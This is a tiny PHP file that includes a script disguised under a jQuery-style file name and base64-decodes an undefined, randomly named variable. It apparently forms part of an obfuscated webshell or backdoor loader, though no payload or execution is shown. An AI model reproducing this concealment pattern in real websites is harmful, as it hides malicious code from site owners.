<?php
include "exporting.jquery.src.php";
$echo = base64_decode($acak);
?>